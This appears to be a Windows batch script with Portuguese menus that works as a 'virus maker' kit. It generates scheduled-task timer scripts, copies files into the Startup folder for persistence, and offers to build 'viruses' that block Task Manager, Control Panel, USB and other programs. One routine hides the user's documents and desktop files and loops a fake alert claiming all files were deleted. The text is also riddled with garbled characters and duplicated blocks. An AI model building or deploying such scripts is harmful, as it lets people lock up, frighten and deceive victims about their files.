echo  if exist lig16.drv goto 17 >> "%bm%".cmd
echo  echo ^> lig16.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :17 >> "%bm%".cmd
echo  if exist lig17.drv goto 18 >> "%bm%".cmd
echo  echo ^> lig17.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :18 >> "%bm%".cmd
echo  if exist lig18.drv goto 19 >> "%bm%".cmd
echo  echo ^> lig18.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :19 >> "%bm%".cmd
echo  if exist lig19.drv goto 20 >> "%bm%".cmd
echo  echo ^> lig19.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :20 >> "%bm%".cmd
echo  if exist lig20.drv goto 21 >> "%bm%".cmd
echo  echo ^> lig20.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :21 >> "%bm%".cmd
echo  if exist lig22.drv goto 23 >> "%bm%".cmd
echo  echo ^> lig22.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :23 >> "%bm%".cmd
echo  if exist lig23.drv goto 24 >> "%bm%".cmd
echo  echo ^> lig23.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :24 >> "%bm%".cmd
echo  if exist lig24.drv goto 25 >> "%bm%".cmd
echo  echo ^> lig24.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :25 >> "%bm%".cmd
echo  if exist lig25.drv goto 26 >> "%bm%".cmd
echo  echo ^> lig25.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :26 >> "%bm%".cmd
echo  if exist lig26.drv goto 27 >> "%bm%".cmd
echo  echo ^> lig26.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :27 >> "%bm%".cmd
echo  if exist lig27.drv goto 28 >> "%bm%".cmd
echo  echo ^> lig27.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :28 >> "%bm%".cmd
echo  if exist lig28.drv goto 29 >> "%bm%".cmd
echo  echo ^> lig28.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :29 >> "%bm%".cmd
echo  if exist lig29.drv goto 30 >> "%bm%.cmd
echo  echo ^> lig29.drv sdfsdf >> "%bm%.cmd
echo  goto fim >> "%bm%".cmd
echo  :30 >> "%bm%".cmd
echo  if exist lig30.drv goto 31 >> "%bm%".cmd
echo  echo ^> lig30.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  : fim >> "%bm%".cmd
echo  exit >> "%bm%".cmd
echo  :31 >> "%bm%".cmd
echo  del *.drv >> "%bm%".cmd
:result
cls
echo MsgBox "DIGITE UM COMANDO PRA SEU CำDIGO ACIONA-LO",vbOKOnly + vbInformation, "CำDIGO INCOMPLETO" >%temp%\wyz.vbs
start %temp%\wyz.vbs
echo.
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
echo     DIGITAR CODIGO  (A )
echo.
echo    PROSEGUIR       ( B )
echo.
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p cod=  
if %cod% equ A goto dig
if %cod% equ B goto end
goto result

:dig

cls
echo.
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
echo     DIGITE SEU CODIGO  
echo.
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p co=  DIGITE ENTER PARA COMEวAR SEU CODIGO
:texty
set /p maistxt=:

if "%maistxt%"=="%maistxt%" echo %maistxt% >> "%bm%".cmd
goto texty

:end
goto bomb2

=========== TAREFA AGENDADA===============


:traf
CLS
echo.
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
echo     DIGITE A QUANTIDADE DE MINUTOS 
echo.
echo     PARA A ATIVACAO DO ARQUIVO
echo.
echo    EXEMPLO ( 1 ) OU ( 2,3,4.....)
echo.
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p m=

CLS


echo.
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
echo     DIGITE O NOME DO RELOGIO
echo.
echo     PARA AGENDA-LO
echo.
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p NOM=

echo @ echo off > %NOM%.cmd
echo cd /d %%~dp0 >>%NOM%.cmd
echo SCHTASKS /create /sc minute /mo %m% /tn %NOM% /tr >> %NOM%.cmd
echo DEL %NOM%.cmd >> %NOM%.cmd
goto bomb2


::=====RELOGIO===========================



:RL
TITLE CRIAR RELOGIO COM DISPARADORES
Color A
cls
echo.
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
echo    CRIAR RELOGIO COM DISPARADORES ( CRIAR )
echo.
echo    PARA VOLTAR PARA INICIO DIGITE  ((  v  ))
echo.
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p fg=
if %fg% equ CRIAR goto MK
if %fg% equ V goto bomb2
echo MsgBox " CAPS LOOK DESLIGADO COMANDO [ %fg% ] NรO ACEITO  ",vbOKOnly + vbInformation, "ERRO DE DIGITAวรO" >%temp%\wyz.vbs
start %temp%\wyz.vbs
goto RL
:MK
cls
echo.
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
echo DIGITE O NOME DE SEU RELOGIO
echo.
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p bm= 

@ echo off
::=============================
:: seg/drv
::=============================
echo @echo off >> "%bm%".cmd
echo mode 20,5 >> "%bm%".cmd
echo :DE >> "%bm%".cmd
echo ping 127.0.0.1 -n 2 > nul >> "%bm%".cmd
echo  if exist seg1.drv goto 2 >> "%bm%".cmd
echo  echo ^> seg1.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :2 >> "%bm%".cmd
echo  if exist seg2.drv goto 3 >> "%bm%".cmd
echo  echo ^> seg2.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :3 >> "%bm%".cmd
echo  if exist seg3.drv goto 4 >> "%bm%".cmd
echo  echo ^> seg3.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :4 >> "%bm%".cmd
echo  if exist seg4.drv goto 5 >> "%bm%".cmd
echo  echo ^> seg4.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :5 >> "%bm%".cmd
echo  if exist seg5.drv goto 6 >> "%bm%".cmd
echo  echo ^> seg5.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :6 >> "%bm%".cmd
echo  if exist seg6.drv goto 7 >> "%bm%".cmd
echo  echo ^> seg6.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :7 >> "%bm%".cmd
echo  if exist seg7.drv goto 8 >> "%bm%".cmd
echo  echo ^> seg7.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :8 >> "%bm%".cmd
echo  if exist seg8.drv goto 9 >> "%bm%".cmd
echo  echo ^> seg8.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :9 >> "%bm%".cmd
echo  if exist seg9.drv goto 10 >> "%bm%".cmd
echo  echo ^> seg9.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :10 >> "%bm%".cmd
echo  if exist seg10.drv goto 11 >> "%bm%".cmd
echo  echo ^> seg10.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :11 >> "%bm%".cmd
echo del *.drv >> "%bm%".cmd
::=============================
:: min/.vbs
::=============================
echo  if exist min11.vbs goto 12 >> "%bm%".cmd
echo  echo ^> min11.vbs sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :12 >> "%bm%".cmd
echo  if exist min12.vbs goto 13 >> "%bm%".cmd
echo  echo ^> min12.vbs sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :13 >> "%bm%".cmd
echo  if exist min13.vbs goto 14 >> "%bm%".cmd
echo  echo ^> min13.vbs sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :14 >> "%bm%".cmd
echo  if exist min14.vbs goto 15 >> "%bm%".cmd
echo  echo ^> min14.vbs sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :15 >> "%bm%".cmd
echo  if exist min15.vbs goto 16 >> "%bm%".cmd
echo  echo ^> min15.vbs sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :16 >> "%bm%".cmd
echo  if exist min16.vbs goto 17 >> "%bm%".cmd
echo  echo ^> min16.vbs sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :17 >> "%bm%".cmd
echo  if exist min17.vbs goto 18 >> "%bm%".cmd
echo  echo ^> min17.vbs sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :18 >> "%bm%".cmd
echo  if exist min18.vbs goto 19 >> "%bm%".cmd
echo  echo ^> min18.vbs sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :19 >> "%bm%".cmd
echo  if exist min19.vbs goto 20 >> "%bm%".cmd
echo  echo ^> min19.vbs sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :20 >> "%bm%".cmd
echo  if exist min20.vbs goto 21 >> "%bm%".cmd
echo  echo ^> min20.vbs sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :21 >> "%bm%".cmd 
echo  del *.vbs >> "%bm%".cmd
::==============================
:: hour/.hlp
::==============================
echo  if exist hour22.hlp goto 23 >> "%bm%".cmd
echo  echo ^> hour22.hlp sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :23 >> "%bm%".cmd
echo  if exist hour23.hlp goto 24 >> "%bm%".cmd
echo  echo ^> hour23.hlp sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :24 >> "%bm%".cmd
echo  if exist hour24.hlp goto 25 >> "%bm%".cmd
echo  echo ^> hour24.hlp sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :25 >> "%bm%".cmd
echo  if exist hour25.hlp goto 26 >> "%bm%".cmd
echo  echo ^> hour25.hlp sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :26 >> "%bm%".cmd
echo  if exist hour26.hlp goto 27 >> "%bm%".cmd
echo  echo ^> hour26.hlp sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :27 >> "%bm%".cmd
echo  if exist hour27.hlp goto 28 >> "%bm%".cmd
echo  echo ^> hour27.hlp sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :28 >> "%bm%".cmd
echo  if exist hour28.hlp goto 29 >> "%bm%".cmd
echo  echo ^> hour28.hlp sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :29 >> "%bm%".cmd
echo  if exist hour29.hlp goto 30 >> "%bm%.cmd
echo  echo ^> hour29.hlp sdfsdf >> "%bm%.cmd
echo  goto fim >> "%bm%".cmd
echo  :30 >> "%bm%".cmd
echo  if exist hour30.hlp goto 31 >> "%bm%".cmd
echo  echo ^> hour30.hlp sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  : fim >> "%bm%".cmd
echo  goto DE >> "%bm%".cmd
echo  :31 >> "%bm%".cmd
echo  del *.hlp >> "%bm%".cmd

echo.
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
echo  QUER INSERIR COMANDOS AO RELOGIO
echo.
echo     S =SIM
echo.
echo     N = NAO
echo.
echo.    C = CANCELAR
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
choice /C SNC /N /CS /T 20 /D N /M "  A€วO OU ESTRATGIA  "
 IF errorlevel = S goto dig
 IF errorlevel = N goto bomb2
 IF errorlevel = C goto end

::ABC=OPวีES 
::/N=OCULTA AS OPวีES
::/CS=DIFERENCIA MAIUSCULA DE MINUSCULA
::/T=TEMPO
::/D=OPวรO ESCOLHIDA PRA ACIONAR DEPOIS DO TEMPO ESCOLHIDO
::/M=MENSAGEM



echo MsgBox "ARQUIVO [ %bm% ] CRIADO COM SUCESSO",vbOKOnly + vbInformation, "CำDIGO INCOMPLETO" >%temp%\wyz.vbs
start %temp%\wyz.vbs
goto result


:copy


CLS
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
echo    COPIAR PARA PASTA TEMPORARIA (TEMP )
echo.
echo    COPIAR PARA PASTA INICIAR ( INI )
echo.
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p ps=
if %ps% equ TEMP goto tp
if %ps% equ INI goto TP2

echo MsgBox "CAPS LOOK DESLIGADO [ %bm% ] MINฺSCULO NรO ACEITO",vbOKOnly + vbInformation, "CำDIGO MINฺSCULO" >%temp%\wyz.vbs
start %temp%\wyz.vbs

goto copy
:tp
cls
echo.
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo    COPIAR PARA A PASTA TEMPORARIA
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
echo     DIGITE O NOME DO ARQUIVO OU
echo.
echo     ARRASTE O ARQUIVO P/ JANELA
echo.
set /p tp=

xcopy %tp% %temp%
goto bomb2

:TP2
cls
echo.
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo    COPIAR PARA A PASTA INICIAR
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
echo     DIGITE O NOME DO ARQUIVO OU
echo.
echo     ARRASTE O ARQUIVO P/ JANELA
echo.
set /p in=

xcopy %in% "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
goto bomb2


cls
echo pause >> "%nome1%.bat
echo MsgBox "ARQUIVO [ "%nome1%.bat" ] CRIADO COM SUCESSO",vbOKOnly + vbInformation, "CAMUFLAGEM" >%temp%\wyz.vbs
start %temp%\wyz.vbs
CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto VIRUS


 :b
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ 
@ECHO OFF  
:vcol  
COLOR C0  
ECHO              VIRUS  
ECHO                                                                 VIRUS  
COLOR 10  
ECHO                          VIRUS  
ECHO                                          VIRUS        
COLOR 20                                              
ECHO          VIRUS 
ECHO                        VIRUS 
ECHO                                                                     VIRUS  
ECHO                                  VIRUS  
COLOR B0 
ECHO                                VIRUS 
COLOR F0 
ECHO              VIRUS 
ECHO                                                   VIRUS 
ECHO                                                                                    VIRUS 
COLOR 50 
goto G 
CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto VIRUS



:c
@echo off
tskill explorer
cd "C:\WINDOWS"
start explorer.exe
cd "C:\Documents and Settings\%username%"
rename "Meus documentos" 12
attrib 12 +h +s
cd "C:\Documents and Settings\%username%\Desktop"
attrib * +h +s
:1


echo MsgBox "TODOS OS SEUS ARQUIVOS FORAM DELETADOS PARA MAIS DETALHES FALE COM O \\ ADM //  ELE PODERA TE AJUDAR... MANTENHA A CALMA VOCส TERA O SEUS ARQUIVOS DE VOLTA!!!",vbOKOnly + vbCritical, "VIRUS CAMUFLAGEM" >%temp%\wyz.vbs
start %temp%\wyz.vbs
goto :1

cls
goto VIRUS

:d
 vacina do desk top
attrib * -h -r
cls
goto VIRUS

:e        
cls
goto ultimat


CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto VIRUS

:d

CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto VIRUS

:e

CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto VIRUS
:v 
goto ultimat


:fabri

@echo off
:in
cls
title.                               -=^>^> Scripts ( js ) Scripts ^<^<=-
color 0a
mode 65,32
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo        -= Menu principal =-= Use ENTER a pขs uma Aฦo =-
echo 
echo                              DIGITE
echo                             --------
echo       Usar na cor VERMELHO =- a AZUL =- b VERDE =- c
echo      ---------------------------------------------------
echo.
echo           { digite -=^>^> v ^<^<=- para voltar ao menu principal}
echo           ----------------------------------------
echo           { 1 ^<= Criar Vกrus com janelas de erros falso
echo. 
echo           { 2 ^<= Criar Vกrus que fala mensagem
echo. 
echo           { 3 ^<= Criar Vกrus para bloquear USB
echo. 
echo           { 4 ^<= Criar Vกrus para bloquear Painel de controle
echo. 
echo           { 5 ^<= Vกrus Remover a Lixeira, Meus locais de rede,
echo           Meu computador, e Meus documentos da area de trebalho
echo _________________________________________________________________
echo                     IR=^>^> Pagina 2 =- P
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo Comando =- 
ping 127.0.0.1 -n 2 > nul
cls
title.                               -=^>^> Scripts ( js ) Scripts ^<^<=-
color 1f
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo        -= Menu principal =-= Use ENTER a pขs uma Aฦo =-
echo 
echo                              DIGITE
echo                             --------
echo       Usar na cor VERMELHO =- a AZUL =- b VERDE =- c
echo      ---------------------------------------------------
echo.
echo           { digite -=^>^> v ^<^<=- para voltar ao menu principal}
echo           ----------------------------------------
echo           { 1 ^<= Criar Vกrus com janelas de erros falso
echo. 
echo           { 2 ^<= Criar Vกrus que fala mensagem
echo. 
echo           { 3 ^<= Criar Vกrus para bloquear USB
echo. 
echo           { 4 ^<= Criar Vกrus para bloquear Painel de controle
echo. 
echo           { 5 ^<= Vกrus Remover a Lixeira, Meus locais de rede,
echo           Meu computador, e Meus documentos da area de trebalho
echo _________________________________________________________________
echo                     IR=^>^> Pagina 2 =- P
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo Comando =- 
ping 127.0.0.1 -n 2 > nul
cls
title.                               -=^>^> Scripts ( js ) Scripts ^<^<=-
color 0c
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo        -= Menu principal =-= Use ENTER a pขs uma Aฦo =-
echo 
echo                              DIGITE
echo                             --------
echo       Usar na cor VERMELHO =- a AZUL =- b VERDE =- c
echo      ---------------------------------------------------
echo.
echo           { digite -=^>^> v ^<^<=- para voltar ao menu principal}
echo           ----------------------------------------
echo           { 1 ^<= Criar Vกrus com janelas de erros falso
echo. 
echo           { 2 ^<= Criar Vกrus que fala mensagem
echo. 
echo           { 3 ^<= Criar Vกrus para bloquear USB
echo. 
echo           { 4 ^<= Criar Vกrus para bloquear Painel de controle
echo. 
echo           { 5 ^<= Vกrus Remover a Lixeira, Meus locais de rede,
echo           Meu computador, e Meus documentos da area de trebalho
echo _________________________________________________________________
echo                     IR=^>^> Pagina 2 =- P
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo Comando =- 
ping 127.0.0.1 -n 2 > nul
cls
:ve
cls
title.                               -=^>^> Scripts ( js ) Scripts ^<^<=-
color 0a
goto ins
:az
cls
title.                               -=^>^> Scripts ( js ) Scripts ^<^<=-
color 1f
goto ins
:ver
cls
title.                               -=^>^> Scripts ( js ) Scripts ^<^<=-
color 0c

:ins
mode 65,32
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo        -= Menu principal =-= Use ENTER a pขs uma Aฦo =-
echo 
echo                              DIGITE
echo                             --------
echo       Usar na cor VERMELHO =- a AZUL =- b VERDE =- c
echo      ---------------------------------------------------
echo.
echo           { digite -=^>^> v ^<^<=- para voltar ao menu principal}
echo           ----------------------------------------
echo           { 1 ^<= Criar Vกrus com janelas de erros falso
echo. 
echo           { 2 ^<= Criar Vกrus que fala mensagem
echo. 
echo           { 3 ^<= Criar Vกrus para bloquear USB
echo. 
echo           { 4 ^<= Criar Vกrus para bloquear Painel de controle
echo. 
echo           { 5 ^<= Vกrus Remover a Lixeira, Meus locais de rede,
echo           Meu computador, e Meus documentos da area de trebalho
echo _________________________________________________________________
echo                     IR=^>^> Pagina 2 =- P
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
set /p s0=Comando =- 
if  %s0%  == y goto you
if  %s0% == f goto fac
if  %s0% == v goto menu
if  %s0%  == 1 goto v1
if  %s0% == 2 goto v2
if  %s0%  == 3 goto v3
if  %s0% == 4 goto v4
if  %s0% == 5 goto v5
if  %s0% == p goto inp2
if  %s0% == c goto ve
if  %s0%  == b goto az
if  %s0%  == a goto ver
echo msgbox"Erro [ %s0% ] nใo ้ um comando veja se a CAPS LOCK estแ ativada",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js03.vbs
start %temp%\js03.vbs
goto in
::PAGINA 02
:inp2
cls
title.                               -=^>^> Scripts ( js ) Scripts ^<^<=-
color 0a
mode 65,27
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo         -= Pagina 2 =-= Use ENTER a pขs uma Aฦo =-
echo 
echo                              DIGITE
echo                             --------
echo       Usar na cor VERMELHO =- a AZUL =- b VERDE =- c
echo      ---------------------------------------------------
echo     { 1 ^<= Criar Vกrus para Bloquear qualquer Programa 
echo.
echo     { 2 ^<= Criar Vกrus para Esconde o botฦo Desligar/Logoff
echo.
echo     { 3 ^<= Criar Vกrus para Bloquear o Gerenciador de tarefas
echo.
echo     { 4 ^<= Criar Vกrus para Bloquear o Executar
echo.
echo     { 5 ^<= Criar Vกrus para Esconder o Relขgio
echo.
echo     { 6 ^<= Criar Vกrus para Bloquear Lado direito do Mouse
echo _________________________________________________________________
echo                  M -= Menu principal ^<^<=IR 
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo Comando =- 
ping 127.0.0.1 -n 2 > nul
cls
title.                               -=^>^> Scripts ( js ) Scripts ^<^<=-
color 1f
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo         -= Pagina 2 =-= Use ENTER a pขs uma Aฦo =-
echo 
echo                              DIGITE
echo                             --------
echo       Usar na cor VERMELHO =- a AZUL =- b VERDE =- c
echo      ---------------------------------------------------
echo     { 1 ^<= Criar Vกrus para Bloquear qualquer Programa 
echo.
echo     { 2 ^<= Criar Vกrus para Esconde o botฦo Desligar/Logoff
echo.
echo     { 3 ^<= Criar Vกrus para Bloquear o Gerenciador de tarefas
echo.
echo     { 4 ^<= Criar Vกrus para Bloquear o Executar
echo.
echo     { 5 ^<= Criar Vกrus para Esconder o Relขgio
echo.
echo     { 6 ^<= Criar Vกrus para Bloquear Lado direito do Mouse
echo _________________________________________________________________
echo                  M -= Menu principal ^<^<=IR 
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo Comando =- 
ping 127.0.0.1 -n 2 > nul
cls
title.                               -=^>^> Scripts ( js ) Scripts ^<^<=-
color 0c
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo         -= Pagina 2 =-= Use ENTER a pขs uma Aฦo =-
echo 
echo                              DIGITE
echo                             --------
echo       Usar na cor VERMELHO =- a AZUL =- b VERDE =- c
echo      ---------------------------------------------------
echo     { 1 ^<= Criar Vกrus para Bloquear qualquer Programa 
echo.
echo     { 2 ^<= Criar Vกrus para Esconde o botฦo Desligar/Logoff
echo.
echo     { 3 ^<= Criar Vกrus para Bloquear o Gerenciador de tarefas
echo.
echo     { 4 ^<= Criar Vกrus para Bloquear o Executar
echo.
echo     { 5 ^<= Criar Vกrus para Esconder o Relขgio
echo.
echo     { 6 ^<= Criar Vกrus para Bloquear Lado direito do Mouse
echo _________________________________________________________________
echo                  M -= Menu principal ^<^<=IR  
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo Comando =- 
ping 127.0.0.1 -n 2 > nul
cls
:ve2
cls
title.                               -=^>^> Scripts ( js ) Scripts ^<^<=-
color 0a
goto ins2
:az2
cls
title.                               -=^>^> Scripts ( js ) Scripts ^<^<=-
color 1f
goto ins2
:ver2
cls
title.                               -=^>^> Scripts ( js ) Scripts ^<^<=-
color 0c
:ins2
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo         -= Pagina 2 =-= Use ENTER a pขs uma Aฦo =-
echo 
echo                              DIGITE
echo                             --------
echo       Usar na cor VERMELHO =- a AZUL =- b VERDE =- c
echo      ---------------------------------------------------
echo     { 1 ^<= Criar Vกrus para Bloquear qualquer Programa 
echo.
echo     { 2 ^<= Criar Vกrus para Esconde o botฦo Desligar/Logoff 
echo.
echo     { 3 ^<= Criar Vกrus para Bloquear o Gerenciador de tarefas
echo.
echo     { 4 ^<= Criar Vกrus para Bloquear o Executar
echo.
echo     { 5 ^<= Criar Vกrus para Esconder o Relขgio
echo.
echo     { 6 ^<= Criar Vกrus para Bloquear Lado direito do Mouse
echo _________________________________________________________________
echo                  M -= Menu principal ^<^<=IR 
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
set /p s0=Comando =- 
if  %s0% == 1 goto v6
if  %s0% == 2 goto v7
if  %s0% == 3 goto v8
if  %s0% == 4 goto v9
if  %s0% == 5 goto v10
if  %s0% == 6 goto v11
if  %s0% == m goto in
if  %s0% == c goto ve2
if  %s0% == b goto az2
if  %s0% == a goto ver2
echo msgbox"Erro [ %s0% ] nใo ้ um comando veja se a CAPS LOCK estแ ativada",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js03.vbs
start %temp%\js03.vbs
goto inp2
:you
start www.youtube.com/jspapeldeparede
goto in
:fac
start www.facebook.com/js.feitosa.7
goto in

:v1
mode 65,15
cls
echo.
